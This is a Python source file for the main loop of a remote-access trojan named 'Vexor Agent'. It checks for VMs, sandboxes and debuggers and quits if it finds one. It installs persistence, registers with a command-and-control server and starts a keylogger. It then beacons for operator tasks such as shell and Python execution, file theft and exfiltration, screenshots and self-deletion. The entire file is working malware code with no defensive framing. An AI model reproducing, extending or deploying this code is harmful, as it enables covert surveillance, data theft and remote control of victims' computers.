"""Vexor Agent — main entry point."""

import json
import time
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from config import C2_HOST, C2_PORT, BEACON_INTERVAL, AES_KEY
from vexor.c2 import C2Channel
from vexor import crypto
from vexor.persistence import install, uninstall
from vexor.recon import gather
from vexor.executor import run_shell, run_python, read_file, write_file, download, list_dir
from vexor.exfil import collect_files, exfil_to_server
from vexor.keylogger import Keylogger
from vexor.screenshot import capture, save
from vexor.evasion import sleep_evasion, check_vm, check_sandbox, anti_debug


class Agent:
    def __init__(self):
        self.c2 = C2Channel(C2_HOST, C2_PORT, AES_KEY)
        self.keylogger = Keylogger()
        self.commands = {
            "shell": self._cmd_shell,
            "python": self._cmd_python,
            "read": self._cmd_read,
            "write": self._cmd_write,
            "download": self._cmd_download,
            "upload": self._cmd_upload,
            "ls": self._cmd_ls,
            "recon": self._cmd_recon,
            "persist": self._cmd_persist,
            "unpersist": self._cmd_unpersist,
            "keylog_start": self._cmd_keylog_start,
            "keylog_stop": self._cmd_keylog_stop,
            "keylog_dump": self._cmd_keylog_dump,
            "screenshot": self._cmd_screenshot,
            "exfil": self._cmd_exfil,
            "selfdestruct": self._cmd_selfdestruct,
        }

    def run(self):
        sleep_evasion(10)
        anti_debug()

        if check_vm() or check_sandbox():
            return

        install()

        self.c2.register()
        self.keylogger.start()

        while True:
            try:
                response = self.c2.check_in()
                if response.get("status") == "success":
                    task = response.get("task")
                    if task:
                        self._handle_task(task)
            except Exception:
                pass
            time.sleep(BEACON_INTERVAL)

    def _handle_task(self, task: dict):
        task_id = task.get("id")
        cmd = task.get("command")
        args = task.get("args", {})

        handler = self.commands.get(cmd)
        if handler:
            output = handler(args)
        else:
            output = f"[unknown command: {cmd}]"

        self.c2.send_result(task_id, output)

    def _cmd_shell(self, args): return run_shell(args.get("cmd", ""))
    def _cmd_python(self, args): return run_python(args.get("code", ""))
    def _cmd_read(self, args): return read_file(args.get("path", ""))
    def _cmd_write(self, args): return write_file(args.get("path", ""), args.get("content", ""))
    def _cmd_download(self, args): return download(args.get("url", ""), args.get("dest", "/tmp/downloaded"))
    def _cmd_ls(self, args): return list_dir(args.get("path", "."))
    def _cmd_recon(self, args): return json.dumps(gather())
    def _cmd_persist(self, args): return f"[persist: {install()}]"
    def _cmd_unpersist(self, args): return f"[unpersist: {uninstall()}]"
    def _cmd_keylog_start(self, args):
        self.keylogger.start()
        return "[keylogger started]"
    def _cmd_keylog_stop(self, args):
        self.keylogger.stop()
        return "[keylogger stopped]"
    def _cmd_keylog_dump(self, args):
        return self.keylogger.get_log()
    def _cmd_screenshot(self, args): return capture()
    def _cmd_exfil(self, args):
        files = collect_files(args.get("paths", []), args.get("extensions"))
        return json.dumps(files[:10])
    def _cmd_upload(self, args): return write_file(args.get("dest", ""), args.get("content", ""))
    def _cmd_selfdestruct(self, args):
        uninstall()
        try:
            os.remove(sys.argv[0])
        except Exception:
            pass
        os._exit(0)


if __name__ == "__main__":
    Agent().run()
